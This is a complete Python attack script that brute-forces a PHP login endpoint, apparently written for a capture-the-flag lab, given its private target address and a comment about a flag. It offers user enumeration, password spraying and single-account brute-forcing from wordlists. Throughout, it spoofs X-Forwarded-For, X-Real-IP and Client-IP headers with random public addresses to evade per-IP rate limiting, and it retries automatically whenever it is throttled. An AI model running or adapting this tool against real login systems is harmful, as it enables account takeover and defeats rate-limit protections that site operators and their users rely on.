#!/usr/bin/env python3
"""
Interceptor login brute-forcer.

Targets /api_login.php with multipart/form-data and rotates X-Forwarded-For
on every request to bypass per-IP rate limiting.

Usage:
    # User enumeration with a fixed password
    python3 bruteforce.py --mode userenum --userlist xato.txt --password password

    # Spray a small password list per user
    python3 bruteforce.py --mode spray   --userlist xato.txt --passlist passwords.txt

    # Single-user password brute (once you have a valid email)
    python3 bruteforce.py --mode pwbrute --user admin@example.com --passlist rockyou-top1000.txt
"""

import argparse
import random
import sys
import time
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

TARGET_URL_DEFAULT = "http://10.113.146.181/api_login.php"

# Strings we treat as "boring / known-bad" responses.
INVALID_CREDS = "Invalid credentials"
MISSING_FIELDS = "Email and password are required"
RATE_LIMITED = "Too many login attempts"


def random_ip() -> str:
    """Generate a random public-ish IPv4 to spoof in X-Forwarded-For.

    Avoids 0.x, 10.x, 127.x, 169.254.x, 172.16-31.x, 192.168.x, 224+.x to
    stay clear of obvious private/reserved ranges that some WAFs drop.
    """
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        if a in (10, 127):
            continue
        if a == 169 and b == 254:
            continue
        if a == 172 and 16 <= b <= 31:
            continue
        if a == 192 and b == 168:
            continue
        return f"{a}.{b}.{c}.{d}"


def build_session() -> requests.Session:
    """Session with light retry-on-network-error, NOT on HTTP status."""
    s = requests.Session()
    retry = Retry(
        total=3,
        connect=3,
        read=3,
        backoff_factor=0.3,
        status_forcelist=(),  # do not retry on HTTP status, we handle that manually
    )
    s.mount("http://", HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20))
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=20))
    return s


def attempt(session: requests.Session, url: str, email: str, password: str,
            timeout: float = 10.0, max_rate_retries: int = 8) -> requests.Response | None:
    """Fire one login attempt. Auto-retries with a fresh IP on rate-limit."""
    # `files=` with (None, value) tuples forces multipart/form-data encoding
    # without attaching an actual file, and lets requests build the boundary.
    data = {
        "email": (None, email),
        "password": (None, password),
    }

    for attempt_n in range(max_rate_retries):
        ip = random_ip()
        headers = {
            "X-Forwarded-For": ip,
            "X-Real-IP": ip,            # some stacks check this instead
            "Client-IP": ip,            # belt and suspenders
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
        }
        try:
            r = session.post(url, files=data, headers=headers, timeout=timeout)
        except requests.RequestException as e:
            print(f"[!] Network error for {email!r}: {e} -- retrying with new IP")
            time.sleep(0.5)
            continue

        body = r.text or ""

        if RATE_LIMITED in body:
            # Rotate IP and try again immediately. Small jitter so we don't hammer.
            time.sleep(0.1 + random.random() * 0.2)
            continue

        return r

    print(f"[!] Gave up on {email!r} after {max_rate_retries} rate-limit retries")
    return None


def is_interesting(resp: requests.Response) -> bool:
    """Anything that is NOT the standard 'Invalid credentials' boring path."""
    if resp is None:
        return False
    body = resp.text or ""
    if INVALID_CREDS in body:
        return False
    if MISSING_FIELDS in body:
        # This means our request shape is wrong -- still print once so you notice.
        return True
    return True


def load_lines(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def run_userenum(args, session):
    users = load_lines(args.userlist)
    print(f"[*] Loaded {len(users)} candidates from {args.userlist}")
    print(f"[*] Spraying fixed password: {args.password!r}")
    hits = []
    for i, u in enumerate(users, 1):
        r = attempt(session, args.url, u, args.password)
        if r is None:
            continue
        if is_interesting(r):
            print(f"[+] HIT  ({i}/{len(users)})  user={u!r}  status={r.status_code}  body={r.text!r}")
            hits.append((u, r.text))
        else:
            if args.verbose:
                print(f"[-] {i}/{len(users)} {u}")
            elif i % 25 == 0:
                print(f"[ ] progress {i}/{len(users)}")
        if args.delay:
            time.sleep(args.delay)
    print(f"\n[=] Done. {len(hits)} interesting responses.")
    for u, body in hits:
        print(f"    {u} -> {body}")


def run_spray(args, session):
    users = load_lines(args.userlist)
    passwords = load_lines(args.passlist)
    print(f"[*] {len(users)} users x {len(passwords)} passwords = "
          f"{len(users) * len(passwords)} total attempts")
    for p in passwords:
        print(f"\n[*] Spraying password: {p!r}")
        for i, u in enumerate(users, 1):
            r = attempt(session, args.url, u, p)
            if r is None:
                continue
            if is_interesting(r):
                print(f"[+] HIT  user={u!r}  pass={p!r}  body={r.text!r}")
            elif args.verbose:
                print(f"[-] {u}:{p}")
            if args.delay:
                time.sleep(args.delay)


def run_pwbrute(args, session):
    passwords = load_lines(args.passlist)
    print(f"[*] Brute-forcing user {args.user!r} with {len(passwords)} passwords")
    for i, p in enumerate(passwords, 1):
        r = attempt(session, args.url, args.user, p)
        if r is None:
            continue
        if is_interesting(r):
            print(f"[+] HIT  ({i}/{len(passwords)})  pass={p!r}  body={r.text!r}")
            # Most likely the flag/credential -- bail early so you don't keep hammering.
            return
        elif args.verbose:
            print(f"[-] {i}/{len(passwords)} {p}")
        elif i % 50 == 0:
            print(f"[ ] progress {i}/{len(passwords)}")
        if args.delay:
            time.sleep(args.delay)


def main():
    p = argparse.ArgumentParser(description="Interceptor login brute-forcer")
    p.add_argument("--url", default=TARGET_URL_DEFAULT, help="Login endpoint URL")
    p.add_argument("--mode", choices=("userenum", "spray", "pwbrute"), required=True)
    p.add_argument("--userlist", help="Path to username/email list (userenum, spray)")
    p.add_argument("--passlist", help="Path to password list (spray, pwbrute)")
    p.add_argument("--user", help="Single username/email (pwbrute)")
    p.add_argument("--password", default="password", help="Fixed password (userenum)")
    p.add_argument("--delay", type=float, default=0.0,
                   help="Seconds to sleep between requests (default 0)")
    p.add_argument("--verbose", "-v", action="store_true", help="Print every attempt")
    args = p.parse_args()

    # Sanity-check the args for the chosen mode.
    if args.mode in ("userenum", "spray") and not args.userlist:
        p.error("--userlist is required for that mode")
    if args.mode in ("spray", "pwbrute") and not args.passlist:
        p.error("--passlist is required for that mode")
    if args.mode == "pwbrute" and not args.user:
        p.error("--user is required for pwbrute mode")

    session = build_session()

    print(f"[*] Target: {args.url}")
    print(f"[*] Mode:   {args.mode}")
    try:
        if args.mode == "userenum":
            run_userenum(args, session)
        elif args.mode == "spray":
            run_spray(args, session)
        else:
            run_pwbrute(args, session)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(130)


if __name__ == "__main__":
    main()
